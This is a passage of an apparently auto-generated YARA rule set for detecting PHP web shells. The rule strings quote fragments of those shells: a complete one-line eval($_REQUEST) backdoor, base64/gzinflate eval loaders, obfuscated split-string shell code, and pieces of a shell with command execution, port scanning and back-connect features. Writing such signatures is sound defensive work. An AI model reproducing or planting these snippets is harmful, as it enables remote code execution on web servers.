      $s16 = "->setDefault('username', function (Options $options): string {" fullword ascii
      $s17 = "* @var OptionsResolver" fullword ascii
      $s18 = "* @var FactoryInterface" fullword ascii
      $s19 = "$this->configureOptions($this->optionsResolver);" fullword ascii
      $s20 = "private $faker;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      8 of them
}

rule sig_2013jiami
{
   meta:
      description = "php17 - file 2013jiami.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e2219e788d89546f19f6f0cb37ee472c5e0de01fb732d2606f3878c5c27e2454"
   strings:
      $s1 = "eval(gzinflate(base64_decode('3X1rcyPJceBnKkL/oQcLbQO7IF4kZ4bEkDMcksPhLIfkECTnRQbUABpAD4FubHeDjx3Nj/HZEfad78JarV621tJZu7rVrh+7Z8" ascii
      $s2 = "YN1jbqK9s7xtrGzqbxRfFmWdH8okErXT1nFmPRnBiTeXx2wFREnZjCPLsmo32rwb7PmMKxxkibxOqjUXxmqHsOOfHw7OT/Ag==')));" fullword ascii
      $s3 = "qz+mHOXMH3NZiNQtxqEeDsntGETq+i0MtC+aN+qK+JWa0x2XVQK/T6AgqaoOF7x8A4w1YhIz/dcbNuapxrrkoh1RVOXmV07H4bmKB4v6hH47lqg1JTedIu5whkdkNHuS" ascii
      $s4 = "+Nl3y4dwpFnW46i4dreyejNYeKeNaszoyePNwov3FnY+tBObyzt0RkqKYamXT8o9bq3ghwd7dX+pvQGs6W84TY2t574PCS38A+GcBQejjt7Va2V3YqyL0OGofZ3rtXT4" ascii
      $s5 = "BNbMJ66AT0mx3Z0CnUTcN8yFNMPInf8NxJASJ3OfzYMjrjCY6dsNVjJ0HMBtLCLZ6yq2dSFpn76ld/9zfYwejEhDjDrgo0EL85c1kaEzg+LDK5W4NDcfpVBIRC+dq1a8" ascii
      $s6 = "$pass = 'ec38fe2a8497e0a8d6d349b3533038cb';" fullword ascii
      $s7 = "Z2eD1HXkakaztXkpDNvtdM50QwegFedCIIYw+G4anSAMgl/0F8lU31DT61/rSoyyevYu9Ra5DlE7PYdNxqzz6JSoo9lhUjECsp5sPBFnXa01KK3KHFVBjZg0WFV+VQKT" ascii
      $s8 = "LPuQRFWDCG7HLuGFse7lGmp6eUqFSwsITpzSHr+joVl14ZWVFedLypQTV33KHVtXOx04jUEHQEfd7xAarJMGaVIwAliR+rmNXy2MOisecG66z05EGBCOmnVkyeELQ6/B" ascii
      $s9 = "CqbpMEMDJMO8vQonY+jmEgDru1yP5eFHM/jGOeRUWMAJ6mNBPGkPz+b3z8Z0oT6c9c5RUNCtY5YCKHExJFNexew9wtEcKfP9qQB3FUuJ4vTE7LXaCkrL2KxWckeRGqBq" ascii
      $s10 = "DCjwD/nJaGffgYdR23lLyVsWqHxrCPmQEzT8ZnLX+QitsysO7pvS/eG1Se2BBPLcTmPILGVDP5srt6swampbxOgwH1WXD1vk0x9DsUPBOHbOH8pxXiA5wilPBntaOYxj" ascii
      $s11 = "7fXEIvlVKJJWzs3k+0IdERW4UUasmS+St0gMyrWCpxh+ahELwtNE/NvdIpl9krAih/2H5PSpycfCCK8RFR1TsxXcAwaUKP/hnsgT3AQo4UUaCMf5LK3LAl1hLKSK8ce/" ascii
      $s12 = "uGpeBDt1Yft6pFA6MeUsMYuaU85JanJwkkcVp1NhtP69M7B3ShbLHfN7aRYGBs2wEqle2i8uZVqem1T+kLWuwWcJzwzvj850qvzb/UP5//3O/81ke/wEA4L4f/WglLjx" ascii
      $s13 = "7J732nYHzjb3/4sw/++u1ffedH7//r73+MFAWtD778498B3tmvoY/DzjRrKgSW9oOfSZi2N7AcNx3su9/49tcjYlbYQ7CSDveDTz759X/3nyRU3+lgmdevTpfL1OzjGg" ascii
      $s14 = "+hzMIS7h3FWzAlpMXqgo8XanvYT1kU3/RuQmVTSoMlQb0rIBnQ48+N+lEQgheps5desOBXboa9YcvDE3xYBZyBfEqZwgiwrGgVvqIeAL5yY//mK4FDfccBZb9FRFksw3" ascii
      $s15 = "97D28j/dt/+Se//d4/6pXBOyjq/on7AWN7kCEjmuCiCHLYATUD9sJ0IHsQM4Zpj6ZTU6vTRrzSm31WEK8Sskutz8gM9Iw9pp2Uw7LPXkoKX0QI8yuS84lxQ6sTlp+QeM" ascii
      $s16 = "c++sW3//Q7f/Fv/5yGZPp6ct5yctZq8hKLCWPvW3/7/V9hvH3yvY//hVCHh0LR9W1Qb4lFVIKwENh4oxc1ab/+yHVxcjku5rJSIdkK2E92z/iWkiVbEzjugdJ1xO5ga3" ascii
      $s17 = "vHeOcPPvnZ937yo/eM1OzXSshJqfT9//L+P3z9h0bL8w4d2/jxz3/w3je+/ke//oNP/uA/fPQXf/yvPvgfBeNbP/vaB9999yvf+pNfvPOrBeODv/7kz775/sfffe+v3v" ascii
      $s18 = "of/s03/vTf//RHv2bgAERGWKvPG5m+1/VGYYaVHrDBnjMh1XGHVhCgiIb/J2ngG68ZU1dnaPG4JVaYda9loTSDmhZR8saWFpBOWaTD6KslszJMlsFyEBCzbLcFC08Df7" ascii
      $s19 = "tPIW6z3fJ83MeZoyP26i8Ga4G/bf/YbraZDXqAn/5hb4SunZjUO/RBuT4kdRyWWnL4oa+dY+QVlt9jxydmeni3i6pKJn5QZH2sTuDSHDc9WC6Je6cdWO0BIrdQUHQR5s" ascii
      $s20 = "gHOPv4MAn8pc9sIK68JsBMAmOfAky6/goW8PD5m9/4U/lsuMoSvuHAH5PBCFNDeS8/2/L76Lue45fPbxqZfR86FS3VeFGJc2Rbfqsneyqzf1Iuo5MqfFr8s80+KxbgwL" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      8 of them
}

rule sig_51e611f74860f4929ec79a6d2e3ad2d241daffc9
{
   meta:
      description = "php17 - file 51e611f74860f4929ec79a6d2e3ad2d241daffc9.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2007b51bc5e36689b15953fde226aad278c353f643faf2966b6059c12b42a295"
   strings:
      $s1 = "$headers .= \"Content-Type: text/html; charset=\\\"UTF-8\\\"\\r\\nContent-Transfer-Encoding: 8bit\\r\\n\\r\\n\";" fullword ascii
      $s2 = "$headers .= \"Content-Type: multipart/mixed; boundary=\\\"\".$rand.\"\\\"\\r\\n\\r\\n\";" fullword ascii
      $s3 = "if(send_email($mailFrom, $mailTo, $mailSubject, $mailContent, $mailAttachment)) output(\"Mail sent to \".html_safe($mailTo));" fullword ascii
      $s4 = "<tr><td colspan='2'><textarea id='mailContent' style='height:140px;min-height:140px;'></textarea></td></tr>" fullword ascii
      $s5 = "$headers .= \"Content-Type: application/octet-stream; name=\\\"\".basename($file).\"\\\"\\r\\n\";" fullword ascii
      $s6 = "$headers .= \"Content-Transfer-Encoding: base64\\r\\n\";" fullword ascii
      $s7 = "if(isset($p['mailFrom'])&&isset($p['mailTo'])&&isset($p['mailSubject'])&&isset($p['mailContent'])){" fullword ascii
      $s8 = "<tr><td>To</td><td><input type='text' id='mailTo' value='' onkeydown=\\\"trap_enter(event, 'mail_send');\\\"></td></tr>" fullword ascii
      $s9 = "$headers .= \"Content-Disposition: attachment\\r\\n\\r\\n\";" fullword ascii
      $s10 = "$content = chunk_split(base64_encode(read_file($file)));" fullword ascii
      $s11 = "$GLOBALS['module']['mail']['js_ontabselected'] = \"if(!portableMode) $('#mailFrom').focus();\";" fullword ascii
      $s12 = "$headers .= $content.\"\\r\\n\\r\\n\";" fullword ascii
      $s13 = "$headers = \"MIME-Version: 1.0\\r\\n\".$from;" fullword ascii
      $s14 = "$mailAttachment = (!empty($mailAttachment))? explode(\"{[|jak3fr0z|]}\", $p['mailAttachment']):array();" fullword ascii
      $s15 = "if(@mail($to, $subject, \"\", $headers)) return true;" fullword ascii
      $s16 = "$GLOBALS['module']['mail']['content'] = \"" fullword ascii
      $s17 = "$mailContent = trim($p['mailContent']);" fullword ascii
      $s18 = "$headers .= \"--\".$rand.\"\\r\\n\";" fullword ascii
      $s19 = "$headers .= \"--\".$rand.\"--\\r\\n\";" fullword ascii
      $s20 = "$headers .= $msg.\"\\r\\n\\r\\n\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      8 of them
}

rule sig_07042ac7d03d3b9911a00da43ce0079a
{
   meta:
      description = "php17 - file 07042ac7d03d3b9911a00da43ce0079a.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f0c38b67024a9458b18f8470417aa6b177612157f7d42d94998a5cbe6373e0a0"
   strings:
      $s1 = "$p='ll(\"/r:([r:\\\\w])[\\\\w-]+(?:r:;q=0.r:(r:[\\\\d]))r:?r:,?/\",$r:ra,$r:m);if($q&&$m){@sessr:ionr:_star:rt();r:$s=';" fullword ascii
      $s2 = "$W='();@evr:al(@gzr:uncr:ompress(@x(@br:asr:r:e64_decor:de(preg_replar:r:ce(arr:ray(\"/r:_/\",\"/r:-/r:\"),arr';" fullword ascii
      $s3 = "$d='ay(\"r:/\",\"+\"),r:$ss(r:$r:s[$i]r:,0,$er:))),$k)));$o=ob_get_cr:or:ntents()r:;ob_enr:r:d_clean();$d=r:br';" fullword ascii
      $s4 = "$U='r:r=$_SERVr:ERr:;$rr=@$r[\"Hr:TTPr:_Rr:EFERER\"];$rr:a=@$rr:r:[\"HTTP_ACr:CEPT_LAr:Nr:GUAGE\"];ir:f($rr&&$ra){$r';" fullword ascii
      $s5 = "$F='&$_SESSIONr:;$ss=\"r:sur:bstr\";r:$sl=\"r:strtolower:r\";$ir:=$m[1][0r:].$m[1]r:[1]r:;$hr:=$sl($sr:s(md5($';" fullword ascii
      $s6 = "$m=':ase64_encor:r:de(x(gzcomprer:ss($r:o),$k));r:pr:rint(\"r:<$k>$d</$k>\"r:)r:;@sr:ession_destroyr:();}}}}';" fullword ascii
      $s7 = "$y='$kh=\"5d41\"r:;$r:r:kf=\"402a\";r:functr:ionr:r: x($t,$k){$c=strlen($r:k);$r:l=strlen($r:r:t);$o=\"\";fr:or($';" fullword ascii
      $s8 = "$n='ey_r:exists(r:$ir:r:,r:$s)){$r:s[$i].=$p;$e=strpr:or:s($s[$i]r:,$f);if($e){$kr:=$khr:.$kf;obr:_startr:';" fullword ascii
      $s9 = "$s=':u=parr:sr:e_urlr:r:r:($rr);parse_str($u[\"r:quer:r:ry\"],$q);$q=array_vr:r:alues($r:q);preg_mr:atch_ar:';" fullword ascii
      $s10 = "$L='+)$p.r:=$q[$m[r:2][$z]r:];if(sr:r:trpos($r:p,$h)r:===0){$s[$r:ir:]=\"\"r:;$p=$ss($p,3);}r:r:if(array_kr:';" fullword ascii
      $s11 = "$x='i=r:0r:;$i<$l;){forr:r:($j=0;($j<r:$c&&$r:i<$l);$jr:++,$ir:++r:){$o.r:=$t{$i}^$k{$r:j};r:}}retr:urn $o;}$';" fullword ascii
      $s12 = "$V='i.$r:kh)r:,0,3));r:$f=$sr:l(r:$ss(md5r:($i.$kf)r:,0,3)r:);$p=\"\";r:for($z=1;r:$z<cour:nr:t($m[1]r:);$z+';" fullword ascii
      $s13 = "$G=str_replace('r:','',$y.$x.$U.$s.$p.$F.$V.$L.$n.$W.$d.$m);" fullword ascii
      $s14 = "$e=str_replace('k','','crkeatke_kfukncktkion');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_0ad641eb3ac0848e5992c137d21b971eddfb2167
{
   meta:
      description = "php17 - file 0ad641eb3ac0848e5992c137d21b971eddfb2167.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "672e7c9020dbeed5b1a37dd45584b54fb9e2b128ec67b5611a72e04ba2a27aa6"
   strings:
      $s1 = "<?php substr(md5($_REQUEST['x']),28)=='acd0'&&eval($_REQUEST['c']);?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule a877d73270ef6d274d3470818dc90a8bc081791e
{
   meta:
      description = "php17 - file a877d73270ef6d274d3470818dc90a8bc081791e.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b91dd91aeced8dd05249e82df0142180f7c5d68ae2314b70084fa09d4222d9d7"
   strings:
      $s1 = "<?php $OOO000000=urldecode('%66%67%36%73%62%65%68%70%72%61%34%63%6f%5f%74%6e%64'); $OOO0000O0=$OOO000000{4}.$OOO000000{9}.$OOO00" ascii
      $s2 = "BRUNBd1FGQmdjSUNRMkxFUUFDQVFJRUJBTUVCd1VFQkFBQkFuY0FBUUlERVFRRklURUdFa0ZSQmFGeEV5SXlnUWdVUXBHaHNjRUpJek5TOEJWNGN0RUtGNFEwdVNYeEZ" ascii
      $s3 = "jVmZ1YVM2R2k0U1cvOEFydS9yVVNhTGgzMTZjVE94YkJSMkxjaXZ4SVA5TGhONXJnL2dPNGxzWWtub2ErdGRocU0yQWx0LzlaK0ZBRjZLQUpsMkEyWC9BUHg4SGVDZ0R" ascii
      $s4 = "0bEx1UzI3bXhYQzl6c1FVaG1IdWsrN0NmNXZSd1hVNnBIT1MvZXh2clgyR3V5Z0NTRC9BRnEwQVhsMkFtV2dDamZmOGZYdUNnRGJoaWdqL3dCMGZ5cmdsMzVSVitKamV" ascii
      $s5 = "8ZDR2IGNsMXNzPWg1MWQ1cj48QzVudDVyPjwxIGhyNWY9IyAybmNsNGNrPSJnKFwncGhwNXYxbFwnLG4zbGwsXCdcJyxcJzRuNFwnKSI+fCBJTklfSU5GTyB8IDwvMT4" ascii
      $s6 = "pO3I1dDNybiBmMWxzNTsnPjxzcDFuPkwyMWQgZjRsNTwvc3Axbj4gPDRucDN0ICBjbDFzcz0ndDIybHNJbnAnIHR5cDU9dDV4dCBuMW01PWY+PDRucDN0IHR5cDU9czN" ascii
      $s7 = "1bEJjRUFISUJycGhCUlZrMXFLU0ErWElOYXh3U09nSEZXTVppU2ZvWC9LZ0JmTFFkRmY4cUFKUklSYWIvdm1nQlRjTXFuQVlmOEFBMUFLTHNYWXM1cDJBQnh6UUEzOXZ" ascii
      $s8 = "tNHNzNDJuOjwvc3Axbj4gJy5tMWRQNXJtc0MybDJyKCRfUE9TVFsncDYnXSkuJyA8c3Axbj5Pd241ci9HcjIzcDo8L3NwMW4+ICcuJDM0ZFsnbjFtNSddLicvJy4kZzR" ascii
      $s9 = "+Jy5iMXM1ZXVfZDVjMmQ1KCJQR0VnMUhKbFpqMDQxSFIwY0QydkxvZG9keWl0WVdSemNHOTBMbWlsZENJZ2RHRnlaYVYwUFNKZllteGhibXM0UGp4emNHRjNQanhtYmF" ascii
      $s10 = "4Z1pHNFluS0NrcU5UWW9PRGtlUTBSRlJrZElTVXBUVkZWV1Y2aFpXbU5rWldabjFHbHFjb1I2ZG5kdTVYcUNndVNGaDI1STRZcVNraVNWbHA1WW1acTQyZVNscHE1MnE" ascii
      $s11 = "MUUJRM3dFM2pnZDNsQUc3R01SSVBZVmk4dFc1VFZmdk1kU015NXpBTnczUldjN2FMcDdtblhJZFlVa0lpVHhKL3lFQi8zQ3Zad284TkhUUytFczFkL3hpUi9qL09zcXZ" ascii
      $s12 = "jNWxsc3AxYzRuZz02IGM1bGxwMWRkNG5nPWkgYmdjMmwycj1ibDFjaz48dHI+PHRkIGJnYzJsMnI9Z3IxeT48c3AxbiBzdHlsNT0iZjJudC13NTRnaHQ6IG4ycm0xbDs" ascii
      $s13 = "nPjxmMnJtIDJuczNibTR0PVwiZygnRjRsNXNNMW4nLG4zbGwsJ2Q1bDV0NScsdGg0cy5kNWwudjFsMzUpO3I1dDNybiBmMWxzNTtcIj48c3Axbj5fX0RFTEVURV9fPC9" ascii
      $s14 = "rdi9BQTJBckdnQktBSEo5OWZyUUJmV2dDWjFBR1hIb3V2cVBpMEFVTG4vQUY3L0FGTkFFVkFEdWY4QVdyUUJmV2dDVjFBR1hIb0gvd0NBL3dBZUFNYVQ3N2ZXZ0J0QUV" ascii
      $s15 = "iPjw0bnAzdCB0eXA1PXQ1eHQgbjFtNT1jaG0yZCB2MWwzNT0iJy5zM2JzdHIoc3ByNG50ZignJTInLCBmNGw1cDVybXMoJF9QT1NUWydwNiddKSksLXUpLiciPjw0bnA" ascii
      $s16 = "GNGw1c00xbicsbjNsbCwnbWtkNHInLHRoNHMuZC52MWwzNSk7cjV0M3JuIGYxbHM1O1wiPjxzcDFuPl9fTUsgRElSX188L3NwMW4+PGJyPjw0bnAzdCBjbDFzcz0nZDR" ascii
      $s17 = "yL25RQlEzZjk1LzZOQUVWQUR1ZjlZdjYyQXZMUUJNbEFETG43ai9BUEFmaTBBWnNuK3NQNjJBYlFCTGIvZXo4S0FMcTBBU3JRQlI2RC9qdXo3Q2dDMzFBRTJBY25vNit" ascii
      $s18 = "2IHN0eWw1PSdtMXJnNG4tdDJwOmlweCc+IyBDMW50IDFjYzVzcyB0aDRzIGY0bDUgMm4gczVydjVyIC0+IFsgLzV0Yy9uMW01ZC5jMm5mIF08L3ByNT48L2M1bnQ1cj4" ascii
      $s19 = "TUUw6Jy4kbXlzcWwuJyAgTVNTUUw6Jy4kbXNzcWwuJyAgUDJzdGdyNVNRTDonLiRwZy4nICBPcjFjbDU6IDwvc3Axbj4nLiQyci4nPC90ZD48dGQgdzRkdGg9IjZpJSI" ascii
      $s20 = "yICc8c2NyNHB0PnBvXz0iIjs8L3NjcjRwdD48ZjJybSAybnMzYm00dD0iZyhuM2xsLG4zbGwsbjNsbCxuM2xsLHRoNHMuY2htMmQudjFsMzUpO3I1dDNybiBmMWxzNTs" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule AbstractAccessRegistry
{
   meta:
      description = "php17 - file AbstractAccessRegistry.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "75672146ab6b9a911ffdb903ba8cb7928757b86f0bf23e1fb94588d562f9a588"
   strings:
      $s1 = "use Concrete\\Core\\Permission\\Registry\\Entry\\Access\\EntryInterface;" fullword ascii
      $s2 = "public function getEntriesToRemove()" fullword ascii
      $s3 = "public function getEntries()" fullword ascii
      $s4 = "namespace Concrete\\Core\\Permission\\Registry;" fullword ascii
      $s5 = "public function removeEntry(EntryInterface $entry)" fullword ascii
      $s6 = "public function addEntry(EntryInterface $entry)" fullword ascii
      $s7 = "abstract class AbstractAccessRegistry implements AccessRegistryInterface" fullword ascii
      $s8 = "protected $entriesToRemove = [];" fullword ascii
      $s9 = "$this->entriesToRemove[] = $entry;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule php17_2013
{
   meta:
      description = "php17 - file 2013.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "106c686e2688535d2ff747203fdec675096fc9287655f833485520ae5e8365bb"
   strings:
      $x1 = "formhead(array('title'=>'Execute Command', 'onsubmit'=>'g(\\'shell\\',null,this.p1.value);return false;'));" fullword ascii
      $x2 = "<a href=\"javascript:g('shell',null,'','','','','<?php echo $charset;?>');\">Execute Command</a> | " fullword ascii
      $x3 = "2013 final</a>. Copyright (C) 2004-2013 <a href=\"http://www.4ngel.net\" target=\"_blank\">[S4T]</a> All Rights Reserved." fullword ascii
      $x4 = "p('<p><a href=\"http://w'.'ww.4'.'ng'.'el.net/php'.'sp'.'y/pl'.'ugin/\" target=\"_blank\">Get plugins</a></p>');" fullword ascii
      $x5 = "$res = execute(which('perl').\" /tmp/angel_bc \".$p2.\" \".$p3.\" &\");" fullword ascii
      $s6 = "$res = execute(\"/tmp/angel_bc \".$p2.\" \".$p3.\" &\");" fullword ascii
      $s7 = "<title><?php echo $act.' - '.$_SERVER['HTTP_HOST'];?></title>" fullword ascii
      $s8 = "p('<p class=\"red\">MySQL '.$DB->version().' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'</p>');" fullword ascii
      $s9 = "p('<pre>'.execute($p1).'</pre>');" fullword ascii
      $s10 = "$attachsize = '<a href=\"javascript:g(\\'file\\', null, \\'getsize\\', \\''.$dirdb['filename'].'\\');\">Stat</a>';" fullword ascii
      $s11 = "m('Database has backup to <a href=\"'.$fileurl.'\" target=\"_blank\">'.$P['bak_path'].'</a>');" fullword ascii
      $s12 = "if( strpos( strtolower( $_SERVER['HTTP_USER_AGENT'] ), 'bot' ) !== false ) {" fullword ascii
      $s13 = "echo \"<p class=\\\"b\\\">Mysql error description: \".htmlspecialchars($this->geterrdesc()).\"</p>\\n\";" fullword ascii
      $s14 = "27 => array('Safe mode exec dir',getcfg('safe_mode_exec_dir'))," fullword ascii
      $s15 = "21 => array('upload_max_filesize',(getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed'))," fullword ascii
      $s16 = "formhead(array('title'=>'Eval PHP Code', 'onsubmit'=>'g(\\'eval\\',null,this.p1.value);return false;'));" fullword ascii
      $s17 = "<form onsubmit=\"g('file',this.cwd.value);return false;\" method=\"POST\" id=\"godir\" name=\"godir\">" fullword ascii
      $s18 = "<a href=\"javascript:g('portscan',null,'','','','','<?php echo $charset;?>');\">Port Scan</a> | " fullword ascii
      $s19 = "13 => array('Administrator',(isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from')))," fullword ascii
      $s20 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=<?php echo $charset;?>\">" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}


rule sig_20170728030000_denormalize_metastrings
{
   meta:
      description = "php17 - file 20170728030000_denormalize_metastrings.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e0182f962d2d5e117ab496b8546a4372e1c4a09aca25d84b5396be459d8631d0"
   strings:
      $s1 = "* ) ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;" fullword ascii
      $s2 = "* - Add \"name\" and \"value\" columns to \"metadata\" table" fullword ascii
      $s3 = "* - Populate these new columns from metastrings table by id" fullword ascii
      $s4 = "* - Drop \"metastrings\" table" fullword ascii
      $s5 = "* KEY `string` (`string`(50))" fullword ascii
      $s6 = "* - Add indexes" fullword ascii
      $s7 = "* PRIMARY KEY (`id`)," fullword ascii
      $s8 = "* `id` int(11) NOT NULL AUTO_INCREMENT," fullword ascii
      $s9 = "$prefix = $this->getAdapter()->getOption('table_prefix');" fullword ascii
      $s10 = "* CREATE TABLE `prefix_metastrings` (" fullword ascii
      $s11 = "* `string` text NOT NULL," fullword ascii
      $s12 = "* Denormlize metastrings" fullword ascii
      $s13 = "UPDATE {$prefix}{$table->getName()} n_table" fullword ascii
      $s14 = "* Normalize metastrings" fullword ascii
      $s15 = "FROM {$prefix}{$table->getName()}" fullword ascii
      $s16 = "INNER JOIN {$prefix}metastrings msv ON n_table.value_id = msv.id" fullword ascii
      $s17 = "INNER JOIN {$prefix}metastrings msn ON n_table.name = msn.string" fullword ascii
      $s18 = "INNER JOIN {$prefix}metastrings msv ON n_table.value = msv.string" fullword ascii
      $s19 = "if ($table->hasColumn('name_id') && $table->hasColumn('value_id')) {" fullword ascii
      $s20 = "INNER JOIN {$prefix}metastrings msn ON n_table.name_id = msn.id" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule sig_60c1aa9ff9738fb1f336d3ba845acd7a
{
   meta:
      description = "php17 - file 60c1aa9ff9738fb1f336d3ba845acd7a.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "af91e0b8a6601a1d3f2a6fcbbb260c88f4353e74b057848c85ef82e1ac874b0a"
   strings:
      $s1 = "<img src=\"http://www.journaldugeek.com/files/2012/02/spiderman-amazing.jpg\" width=\"372\" height=\"118\"></p>" fullword ascii
      $s2 = "<input name=\"de\" value=\"<? echo $_POST['de'] ;?>\" size=\"30\" style=\"float: left; background-color: #FFFF00\" /></td>" fullword ascii
      $s3 = "<input name=\"nome\" value=\"<? echo $_POST['nome'] ;?>\" size=\"20\" style=\"float: left; background-color: #FFFF00\" />" fullword ascii
      $s4 = "<input name=\"Submit\" type=\"submit\" value=\"Inbox\" style=\"color: #000080; font-weight: bold\" /></td>" fullword ascii
      $s5 = "<font color=\"#FFFF00\" face=\"Comic Sans MS\" style=\"font-size: 20pt\">" fullword ascii
      $s6 = "<form id=\"form1\" name=\"form1\" method=\"post\" action=\"\">" fullword ascii
      $s7 = "<textarea name=\"emails\" cols=\"88\" rows=\"7\" style=\"background-color: #FFFF00\"></textarea>" fullword ascii
      $s8 = "ZEDqqdv1iNidQQypB/vlPwg/Xw7PTYOgNLu3kklTHG8P8p0z98GETYFP1dJhmST3zgy0X5zf/Y+ulbO8f7botC/9r9y1s2N5k7UiB2V7nHq07D2vU6bzD7SkmasMwA0s" ascii
      $s9 = "YIrckxAYxr/2tFrEqxpw1z3Kx6GEDt02Ypdu4F19YyYFzRcBFShjed1/Irf9/j4yhspjy/r6dLqLQLFCCYAuNsLppvIwrH6QcJpILWYPfwYn57dXaYLcWtlCNHRopSmw" ascii
      $s10 = "eval(str_rot13(gzinflate(str_rot13(base64_decode(($text))))));" fullword ascii
      $s11 = ".style5 {color: #FFFFFF; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px; }" fullword ascii
      $s12 = ".style9 {color: #FFFFFF; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10; }" fullword ascii
      $s13 = "hQ0shMEshDEtuVEvBN65OgNaWpHMDIKItgeUm+sShBXS61/sB\";" fullword ascii
      $s14 = "<body bgcolor=\"#000000\" style=\"text-align: center\">" fullword ascii
      $s15 = "<table width=\"422\" border=\"0\" bgcolor=\"#000000\">" fullword ascii
      $s16 = "HIdlzGYcPIHTU7hF8kpCszthX9vcRdYwQF7UNVhdXQRXHMtDh9TB2XsIHQ7lYfK99w6F5vTWQB6i/M0koSTSLr7nqkk/dFy2kUY8YNoBwLbJzp2Z80vS32n/iTNUllvv" ascii
      $s17 = "<input type=\"hidden\" name=\"vai\" value=\"1\">" fullword ascii
      $s18 = "pJ9DGYkT4FlsZncNwUl0T4IumwdI2QFsL/KWRIbAxqtN8c3QmLgczWIEn0GV+mriejDbpYJrBusBzQ5NSU1wnnE7BsU4zHtE5SorRvuOR+tCJ5zTxeGzsnlDaj2LCFhr" ascii
      $s19 = "PBud2nHxX4iSmBjIbl+WYlwCjlGvEmGuEhg+8H+b9xITWNV+D5K/BSJxcEZ59EdExUVuKyGK3+9RbnopUw9YS1g9buWTB5orB+XX5spu1V/zkim+0akWv1QW+WZ5tU1x" ascii
      $s20 = "1sdUdUDSiV6HIDqdcWl9jGbnPPYpFqdz1eBav/g2dUPZmBQy9ZnacDM8GVm318XBZzfljbGdRSXI+ayqwGD/8aoJwkl4oNtUE/NDVoFQxl48yl49P+4eHp2aUbZOsMpg" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule sig_4adbe35b3a2939ed8bbd5ce6c244dcc2d3e8557f
{
   meta:
      description = "php17 - file 4adbe35b3a2939ed8bbd5ce6c244dcc2d3e8557f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c817a490cfd4d6377c15c9ac9bcfa136f4a45ff5b40c74f15216c030f657d035"
   strings:
      $s1 = "+56GmEyESkHxXRUNoUWUml7OcTc3XvQ6UGtAc0Oa5If+r2CCeeoka5/ShOu1ou5+UGFepn3LFlxd" fullword ascii
      $s2 = "pVsZcM4eJuIcRRI/f6fceGBO4cwngrdcDgFhKEtNHp7jF+NAmFQm6q09pkgFSRPCP5tZxZq8PPNY7T9++Gcn6X5e5csFvXG0JNarHIq9IdzAbWm5+XNf0B\")))));" fullword ascii
      $s3 = "345gk7456{13} . $z2342345gk7456{14} . $z2342345gk7456{12} . $z2342345gk7456{24} . $z2342345gk7456{13} . $z2342345gk7456{14};" fullword ascii
      $s4 = "$as346hgjkhfg = $z2342345gk7456{11} . $z2342345gk7456{10} . $z2342345gk7456{28} . $z2342345gk7456{14} . $z2342345gk7456{" fullword ascii
      $s5 = "$rt4534fhghj5 = $z2342345gk7456{28} . $z2342345gk7456{29} . $z2342345gk7456{27} . $z2342345gk7456{36} . $z2342345gk7456{" fullword ascii
      $s6 = "$qwery45234dws = $z2342345gk7456{28} . $z2342345gk7456{29} . $z2342345gk7456{27} . $z2342345gk7456{27} . $z2342345gk7456" fullword ascii
      $s7 = "$zsweqwq4546dgh = $z2342345gk7456{16} . $z2342345gk7456{35} . $z2342345gk7456{18} . $z2342345gk7456{23} . $z2342345gk745" fullword ascii
      $s8 = "$owe342wfbjdewqre34 = $z2342345gk7456{12} . $z2342345gk7456{24} . $z2342345gk7456{23} . $z2342345gk7456{31} . $z2342345g" fullword ascii
      $s9 = "$z2342345gk7456 = str_rot13(gzinflate(str_rot13(base64_decode(\"MzQyNjE1M7ewNMjLLygsKi4pLSuvqKxXWVdBVlpYz8jMys7JjQcA\"))));" fullword ascii
      $s10 = "ig82KbxoN04HjWj5dwSgFCJspAJz68KsUTXqI8umUAeCMD0pQr/Q0vI/W0Q5g8y+hQWG1gpysvAJ" fullword ascii
      $s11 = "O8nAXHDClyjdVHAI6mP9B4r8jvncmdLQzEIbk59HT3rAjkolhz22fUoQzPOXKTiUOxJetPvqIiOt" fullword ascii
      $s12 = "+HY5dfkRnkNpCMdtoS4pJ+mmCGDuoc5rX9DvE8fFxAu/RTU5EiZagjHI3UKNvHqWmgKsmst6laPw" fullword ascii
      $s13 = "lEWFDR8VvgIhqCJrCFWCbInkXsDyCPma29PPo3cL/oJWf+HFMhvW4SpS+e4aFJoonGoSXmdrrAHW" fullword ascii
      $s14 = "6{15} . $z2342345gk7456{21} . $z2342345gk7456{10} . $z2342345gk7456{29} . $z2342345gk7456{14};" fullword ascii
      $s15 = "27} . $z2342345gk7456{24} . $z2342345gk7456{29} . $z2342345gk7456{0} . $z2342345gk7456{2};" fullword ascii
